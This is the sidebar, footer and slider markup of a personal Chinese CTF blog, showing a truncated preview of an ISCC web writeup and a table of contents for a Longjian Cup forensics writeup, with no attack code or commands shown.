class="info-item-1">2025ISCC区域赛Web-WP比赛感受个人感觉ISCC（以前比赛没打过，不予评价）这次比赛完全没有web的特征，区域赛5个题，每一个题开始都要misc解密（哪吒吃藕联想到food传参，我是真想不到，这题最后也是misc汉字解密），就是群里人说的（Misc套一个Web前端就是Web题了？？？），Web考点考得也不是主要的，十八铜人阵考的ssti，前面要一大段的misc解密，ShallowSeek的web考点是一个ajax头（尼克杨问号脸？？？），只能说ISCC这次举办的web题就是依托 Web+基本功打开网址，是一段题目提示  重点在于这个用户代理身上（修改传输的UA）  只能一个一个尝试，最后在GaoJiGongChengShiFoYeGe(高级工程师佛耶戈)，拿到路由（Q2rN6h3YkZB9fL5j2WmX.php）  路由打开之后是一段需要绕过的源码 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647&lt;?phpshow_source(__FILE...</div></div></div></a></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/images/avatar.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">yyssh</div><div class="author-info-description">我要成web高手</div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">11</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">8</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">6</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/0xYyssh"><i class="fab fa-github"></i><span>call me</span></a></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%AC%AC%E4%BA%8C%E5%B1%8A%E9%99%87%E5%89%91%E6%9D%AF%E5%88%9D%E8%B5%9B%E5%AD%A6%E4%B9%A0WP"><span class="toc-number">1.</span> <span class="toc-text">第二届陇剑杯初赛学习WP</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#hard-web"><span class="toc-number">1.1.</span> <span class="toc-text">hard_web</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE1%E5%BC%80%E6%94%BE%E7%AB%AF%E5%8F%A3%EF%BC%9A"><span class="toc-number">1.1.1.</span> <span class="toc-text">题目1开放端口：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE2%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%A0%B9%E7%9B%AE%E5%BD%95%E4%B8%AD%E7%9A%84flag"><span class="toc-number">1.1.2.</span> <span class="toc-text">题目2服务器根目录中的flag</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE3webshell%E5%AF%86%E7%A0%81"><span class="toc-number">1.1.3.</span> <span class="toc-text">题目3webshell密码</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Server-save"><span class="toc-number">1.2.</span> <span class="toc-text">Server_save</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE1%E9%BB%91%E5%AE%A2%E4%BD%BF%E7%94%A8%E4%BB%80%E4%B9%88%E6%BC%8F%E6%B4%9E%E6%8B%BF%E4%B8%8Broot%E6%9D%83%E9%99%90%E7%9A%84"><span class="toc-number">1.2.1.</span> <span class="toc-text">题目1黑客使用什么漏洞拿下root权限的</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE2%E9%BB%91%E5%AE%A2%E5%8F%8D%E5%BC%B9shell%E7%9A%84ip%E5%92%8C%E7%AB%AF%E5%8F%A3"><span class="toc-number">1.2.2.</span> <span class="toc-text">题目2黑客反弹shell的ip和端口</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE3%E9%BB%91%E5%AE%A2%E7%9A%84%E7%97%85%E6%AF%92%E5%90%8D"><span class="toc-number">1.2.3.</span> <span class="toc-text">题目3黑客的病毒名</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE4%E9%BB%91%E5%AE%A2%E5%88%9B%E5%BB%BA%E4%BA%86%E4%BB%80%E4%B9%88%E7%94%A8%E6%88%B7"><span class="toc-number">1.2.4.</span> <span class="toc-text">题目4黑客创建了什么用户</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE5%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%9C%A8%E8%A2%AB%E5%85%A5%E4%BE%B5%E6%97%B6%E5%A4%96%E7%BD%91ip"><span class="toc-number">1.2.5.</span> <span class="toc-text">题目5服务器在被入侵时外网ip</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE6%E7%97%85%E6%AF%92%E8%BF%90%E8%A1%8C%E4%B9%8B%E5%90%8E%E9%87%8A%E6%94%BE%E6%96%87%E4%BB%B6"><span class="toc-number">1.2.6.</span> <span class="toc-text">题目6病毒运行之后释放文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE7%E7%9F%BF%E6%B1%A0%E5%9C%B0%E5%9D%80"><span class="toc-number">1.2.7.</span> <span class="toc-text">题目7矿池地址</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE8%E9%BB%91%E5%AE%A2%E7%9A%84%E9%92%B1%E5%8C%85%E5%9C%B0%E5%9D%80"><span class="toc-number">1.2.8.</span> <span class="toc-text">题目8黑客的钱包地址</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#WireShark"><span class="toc-number">1.3.</span> <span class="toc-text">WireShark</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE1%E8%A2%AB%E5%85%A5%E4%BE%B5%E7%9A%84%E4%B8%BB%E6%9C%BAip"><span class="toc-number">1.3.1.</span> <span class="toc-text">题目1被入侵的主机ip</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE2%E8%A2%AB%E5%85%A5%E4%BE%B5%E7%9A%84%E4%B8%BB%E6%9C%BA%E5%8F%A3%E4%BB%A4"><span class="toc-number">1.3.2.</span> <span class="toc-text">题目2被入侵的主机口令</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE3%E7%94%A8%E6%88%B7%E7%9B%AE%E5%BD%95%E4%B8%8B%E7%AC%AC%E4%BA%8C%E4%B8%AA%E6%96%87%E4%BB%B6%E5%A4%B9%E5%90%8D"><span class="toc-number">1.3.3.</span> <span class="toc-text">题目3用户目录下第二个文件夹名</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE4-etc-passwd%E5%80%92%E6%95%B0%E7%AC%AC%E4%BA%8C%E4%B8%AA%E7%94%A8%E6%88%B7%E5%90%8D"><span class="toc-number">1.3.4.</span> <span class="toc-text">题目4&#x2F;etc&#x2F;passwd倒数第二个用户名</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#IncidentResponse"><span class="toc-number">1.4.</span> <span class="toc-text">IncidentResponse</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE1%E6%8C%96%E7%9F%BF%E7%A8%8B%E5%BA%8F%E6%89%80%E5%9C%A8%E8%B7%AF%E5%BE%84"><span class="toc-number">1.4.1.</span> <span class="toc-text">题目1挖矿程序所在路径</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE2%E7%9F%BF%E6%B1%A0%E5%9F%9F%E5%90%8D"><span class="toc-number">1.4.2.</span> <span class="toc-text">题目2矿池域名</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE3%E6%94%BB%E5%87%BB%E8%80%85%E7%9A%84%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F"><span class="toc-number">1.4.3.</span> <span class="toc-text">题目3攻击者的利用方式</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE4%E6%94%BB%E5%87%BB%E8%80%85%E7%9A%84ip"><span class="toc-number">1.4.4.</span> <span class="toc-text">题目4攻击者的ip</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE5%E6%94%BB%E5%87%BB%E8%80%85%E5%8F%91%E8%B5%B7%E6%94%BB%E5%87%BB%E6%97%B6%E7%9A%84UA"><span class="toc-number">1.4.5.</span> <span class="toc-text">题目5攻击者发起攻击时的UA</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE6%E6%94%BB%E5%87%BB%E8%80%85%E4%BD%BF%E7%94%A8%E7%9A%84%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%AE%B5"><span class="toc-number">1.4.6.</span> <span class="toc-text">题目6攻击者使用的权限维持手段</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE7%E7%AC%AC%E4%BA%8C%E7%A7%8D%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%AE%B5"><span class="toc-number">1.4.7.</span> <span class="toc-text">题目7第二种权限维持手段</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SmallSword"><span class="toc-number">1.5.</span> <span class="toc-text">SmallSword</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE1%E8%BF%9E%E6%8E%A5%E8%9A%81%E5%89%91%E7%9A%84%E5%AF%86%E7%A0%81"><span class="toc-number">1.5.1.</span> <span class="toc-text">题目1连接蚁剑的密码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE2%E6%94%BB%E5%87%BB%E8%80%85%E7%95%99%E5%AD%98%E7%9A%84%E5%80%BC"><span class="toc-number">1.5.2.</span> <span class="toc-text">题目2攻击者留存的值</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE3%E6%94%BB%E5%87%BB%E8%80%85%E7%9A%84flag"><span class="toc-number">1.5.3.</span> <span class="toc-text">题目3攻击者的flag</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ez-web"><span class="toc-number">1.6.</span> <span class="toc-text">ez_web</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE1%E6%9C%8D%E5%8A%A1%E5%99%A8%E8%87%AA%E5%B8%A6%E7%9A%84%E5%90%8E%E9%97%A8%E6%96%87%E4%BB%B6"><span class="toc-number">1.6.1.</span> <span class="toc-text">题目1服务器自带的后门文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE2%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%9A%84%E5%86%85%E7%BD%91ip"><span class="toc-number">1.6.2.</span> <span class="toc-text">题目2服务器的内网ip</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE3%E6%94%BB%E5%87%BB%E8%80%85%E5%86%99%E5%85%A5%E7%9A%84key"><span class="toc-number">1.6.3.</span> <span class="toc-text">题目3攻击者写入的key</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#baby-forensics"><span class="toc-number">1.7.</span> <span class="toc-text">baby_forensics</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE1%E7%A3%81%E7%9B%98%E4%B8%AD%E7%9A%84key"><span class="toc-number">1.7.1.</span> <span class="toc-text">题目1磁盘中的key</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE2%E7%94%B5%E8%84%91%E4%B8%AD%E8%BF%90%E8%A1%8C%E7%9A%84%E8%AE%A1%E7%AE%97%E5%99%A8%E7%9A%84%E8%BF%90%E8%A1%8C%E7%BB%93%E6%9E%9C"><span class="toc-number">1.7.2.</span> <span class="toc-text">题目2电脑中运行的计算器的运行结果</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE3%E8%AF%A5%E5%86%85%E5%AD%98%E6%96%87%E4%BB%B6%E7%9A%84flag"><span class="toc-number">1.7.3.</span> <span class="toc-text">题目3该内存文件的flag</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#tcpdump"><span class="toc-number">1.8.</span> <span class="toc-text">tcpdump</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE1%E6%94%BB%E5%87%BB%E8%80%85%E7%9A%84%E7%94%A8%E6%88%B7%E5%90%8D%E5%92%8C%E7%99%BB%E5%BD%95%E5%AF%86%E7%A0%81"><span class="toc-number">1.8.1.</span> <span class="toc-text">题目1攻击者的用户名和登录密码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE2%E6%94%BB%E5%87%BB%E8%80%85%E8%B6%8A%E6%9D%83%E7%9A%84cookie"><span class="toc-number">1.8.2.</span> <span class="toc-text">题目2攻击者越权的cookie</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE3%E8%8E%B7%E5%8F%96%E6%94%BB%E5%87%BB%E8%80%85%E7%9A%84jdbc%E7%9A%84%E6%95%B0%E6%8D%AE%E5%BA%93%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81"><span class="toc-number">1.8.3.</span> <span class="toc-text">题目3获取攻击者的jdbc的数据库账号密码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE4%E6%94%BB%E5%87%BB%E8%80%85%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E7%9A%84CVE%E5%92%8CEXP%E6%96%87%E4%BB%B6%E5%90%8D"><span class="toc-number">1.8.4.</span> <span class="toc-text">题目4攻击者执行漏洞的CVE和EXP文件名</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE5%E6%94%BB%E5%87%BB%E8%80%85%E4%B8%8B%E8%BD%BD%E7%9A%84%E5%B7%A5%E5%85%B7"><span class="toc-number">1.8.5.</span> <span class="toc-text">题目5攻击者下载的工具</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#hacked"><span class="toc-number">1.9.</span> <span class="toc-text">hacked</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE1admin%E7%94%A8%E6%88%B7%E7%9A%84%E5%AF%86%E7%A0%81"><span class="toc-number">1.9.1.</span> <span class="toc-text">题目1admin用户的密码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE2app-config-%E2%80%98SECRET-KEY%E2%80%99-%E7%9A%84%E5%80%BC"><span class="toc-number">1.9.2.</span> <span class="toc-text">题目2app.config[‘SECRET_KEY’]的值</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE3flask%E7%94%B1%E5%93%AA%E4%B8%AA%E7%94%A8%E6%88%B7%E5%90%AF%E5%8A%A8"><span class="toc-number">1.9.3.</span> <span class="toc-text">题目3flask由哪个用户启动</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE4%E6%94%BB%E5%87%BB%E8%80%85%E5%86%99%E5%85%A5%E7%9A%84%E5%86%85%E5%AD%98%E9%A9%AC"><span class="toc-number">1.9.4.</span> <span class="toc-text">题目4攻击者写入的内存马</span></a></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/posts/6213db3a.html" title="知攻善防WP"><img src="/coverimages/default_bg12.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="知攻善防WP"/></a><div class="content"><a class="title" href="/posts/6213db3a.html" title="知攻善防WP">知攻善防WP</a><time datetime="2026-01-04T08:27:09.000Z" title="发表于 2026-01-04 16:27:09">2026-01-04</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/143a4fd3.html" title="blogLearn"><img src="/coverimages/default_bg21.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="blogLearn"/></a><div class="content"><a class="title" href="/posts/143a4fd3.html" title="blogLearn">blogLearn</a><time datetime="2026-01-04T03:46:15.000Z" title="发表于 2026-01-04 11:46:15">2026-01-04</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/d071fe4b.html" title="hexoLearn"><img src="/coverimages/default_bg22.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="hexoLearn"/></a><div class="content"><a class="title" href="/posts/d071fe4b.html" title="hexoLearn">hexoLearn</a><time datetime="2026-01-04T03:15:49.000Z" title="发表于 2026-01-04 11:15:49">2026-01-04</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/8dc02fc6.html" title="第二届陇剑杯初赛学习WP"><img src="/coverimages/default_bg19.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="第二届陇剑杯初赛学习WP"/></a><div class="content"><a class="title" href="/posts/8dc02fc6.html" title="第二届陇剑杯初赛学习WP">第二届陇剑杯初赛学习WP</a><time datetime="2025-09-04T10:24:24.000Z" title="发表于 2025-09-04 18:24:24">2025-09-04</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/7d288577.html" title="2025蓝桥杯全国总决赛部分WP"><img src="/coverimages/default_bg2.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="2025蓝桥杯全国总决赛部分WP"/></a><div class="content"><a class="title" href="/posts/7d288577.html" title="2025蓝桥杯全国总决赛部分WP">2025蓝桥杯全国总决赛部分WP</a><time datetime="2025-06-24T09:53:00.000Z" title="发表于 2025-06-24 17:53:00">2025-06-24</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url(/images/top6.jpg);"><div id="footer-wrap"><div id="footer-left"><div class="footer-title"><span>yyssh's blog | </span><span class="footer-copyright">&copy;2025 - 2026 <i class="fa-fw fas fa-heartbeat card-announcement-animation cc_pointer"></i> By yyssh</span></div><div class="wordcount"></div><span>yyssh 已经写了 61.3k 字，</span><span>写到西游记第29回，女儿国国王递婚书，唐僧选择断更，摆烂啊</span></div><div id="footer-right"><div class="footer-totop"><i class="fas fa-chevron-up" onclick="btf.scrollToDest(0, 500)"></i></div><div class="footer-info"><span class="footer-runtime"></span><span class="footer-by"></span></div><div class="footer-service"><a target="_blank" href="https://hexo.io/zh-cn/"><img alt="hexo" src="/shieldImages/hexo.jpg"/></a><a target="_blank" href="https://github.com/0xYyssh"><img alt="github" src="/shieldImages/github.jpg"/></a><a target="_blank" href="https://www.bilibili.com/video/BV12om2YTEgW/?spm_id_from=333.1387.favlist.content.click&amp;vd_source=f2e427ac71efa3412ac58124c4df9be1"><img alt="github" src="/shieldImages/web.jpg"/></a></div></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=5.5.3"></script><script src="/js/main.js?v=5.5.3"></script><div class="js-pjax"></div><script src="/js/foot.js" async></script><script async data-pjax src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div><!-- hexo injector body_end start --><script data-pjax>
+  function butterfly_swiper_injector_config(){
+    var parent_div_git = document.getElementById('recent-posts');
+    var item_html = '<div class="recent-post-item" style="height: auto;width: 100%"><div class="blog-slider swiper-container-fade swiper-container-horizontal" id="swiper_container"><div class="blog-slider__wrp swiper-wrapper" style="transition-duration: 0ms;"><div class="blog-slider__item swiper-slide" style="background:url(coverimages/default_bg19.jpg);border-radius:12px;opacity: 1; transform: translate3d(0px, 0px, 0px); transition-duration: 0ms;"><div class="blog-slider__content"><span class="blog-slider__code">2025-09-04</span><a class="blog-slider__title" onclick="window.open(&quot;posts/8dc02fc6.html&quot;);" href="javascript:void(0);" alt="">第二届陇剑杯初赛学习WP</a><div class="blog-slider__text">个人对第二届陇剑杯的复现学习WP笔记</div></div></div><div class="blog-slider__item swiper-slide" style="background:url(coverimages/default_bg12.jpg);border-radius:12px;opacity: 1; transform: translate3d(0px, 0px, 0px); transition-duration: 0ms;"><div class="blog-slider__content"><span class="blog-slider__code">2026-01-04</span><a class="blog-slider__title" onclick="window.open(&quot;posts/6213db3a.html&quot;);" href="javascript:void(0);" alt="">知攻善防WP</a><div class="blog-slider__text">对知攻善防靶场的一些复现笔记，不喜勿喷！</div></div></div><div class="blog-slider__item swiper-slide" style="background:url(coverimages/default_bg2.jpg);border-radius:12px;opacity: 1; transform: translate3d(0px, 0px, 0px); transition-duration: 0ms;"><div class="blog-slider__content"><span class="blog-slider__code">2025-06-24</span><a class="blog-slider__title" onclick="window.open(&quot;posts/7d288577.html&quot;);" href="javascript:void(0);" alt="">2025蓝桥杯全国总决赛部分WP</a><div class="blog-slider__text">蓝桥杯还是臭名昭著啊，把它的手伸到网安圈子里了，但是我们学校什么奖都认，老师要求没办法，（吐槽一下，蓝桥杯省赛和国赛都要分别交钱，，，，，真是垃圾比赛啊，别的网安比赛都是有奖金的，这垃圾比赛还特么收两次钱，，，）比赛的题目就是i春秋给出的题，只能说是入门题吧（应急题连应急环境都给不出来一个，，，，）（因为作者比较菜，都能写5道，其他的网安比赛作者就只能签到），反正就是给学校打的比赛，就当练练手吧</div></div></div><div class="blog-slider__item swiper-slide" style="background:url(coverimages/default_bg10.jpg);border-radius:12px;opacity: 1; transform: translate3d(0px, 0px, 0px); transition-duration: 0ms;"><div class="blog-slider__content"><span class="blog-slider__code">2025-05-19</span><a class="blog-slider__title" onclick="window.open(&quot;posts/9cd054c0.html&quot;);" href="javascript:void(0);" alt="">2025ISCC区域赛Web-WP</a><div class="blog-slider__text">个人感觉ISCC（以前比赛没打过，不予评价）这次比赛完全没有web的特征，区域赛5个题，每一个题开始都要misc解密（哪吒吃藕联想到food传参，我是真想不到，这题最后也是misc汉字解密），就是群里人说的（Misc套一个Web前端就是Web题了？？？），Web考点考得也不是主要的，十八铜人阵考的ssti，前面要一大段的misc解密，ShallowSeek的web考点是一个ajax头（尼克杨问号脸？？？），只能说ISCC这次举办的web题就是依托</div></div></div><div class="blog-slider__item swiper-slide" style="background:url(coverimages/default_bg20.jpg);border-radius:12px;opacity: 1; transform: translate3d(0px, 0px, 0px); transition-duration: 0ms;"><div class="blog-slider__content"><span class="blog-slider__code">2025-05-19</span><a class="blog-slider__title" onclick="window.open(&quot;posts/a691451b.html&quot;);" href="javascript:void(0);" alt="">2025ISCC区域赛Misc-WP</a><div class="blog-slider__text">ISCC出的misc题倒是各个方面都涉及到了（所以这就是你misc题套web前端出web题的理由吗？），图片隐写，音频隐写，内存取证，多多少少都考了一些，就是最近很多misc都考流量分析去了，ISCC没有出这方面的题（感觉是没有攻防经验啊，所以web出的依托），总的来说中规中矩</div></div></div></div><div class="blog-slider__pagination swiper-pagination-clickable swiper-pagination-bullets"></div><div class="swiper-button-prev"></div><div class="swiper-button-next"></div></div></div>';
+    console.log('已挂载butterfly_swiper')
+    parent_div_git.insertAdjacentHTML("afterbegin",item_html)
+    }
+  var elist = 'undefined'.split(',');
+  var cpage = location.pathname;
+  var epage = '/';
+  var flag = 0;
+
+  for (var i=0;i<elist.length;i++){
+    if (cpage.includes(elist[i])){
+      flag++;
+    }
+  }
+
+  if ((epage ==='all')&&(flag == 0)){
+    butterfly_swiper_injector_config();
+  }
+  else if (epage === cpage){
+    butterfly_swiper_injector_config();
+  }
+  </script><script defer src="https://cdnjs.cloudflare.com/ajax/libs/Swiper/5.4.5/js/swiper.min.js"></script><script defer data-pjax src="https://npm.elemecdn.com/hexo-butterfly-swiper-lyx/lib/swiper_init.js"></script><!-- hexo injector body_end end --></body></html>
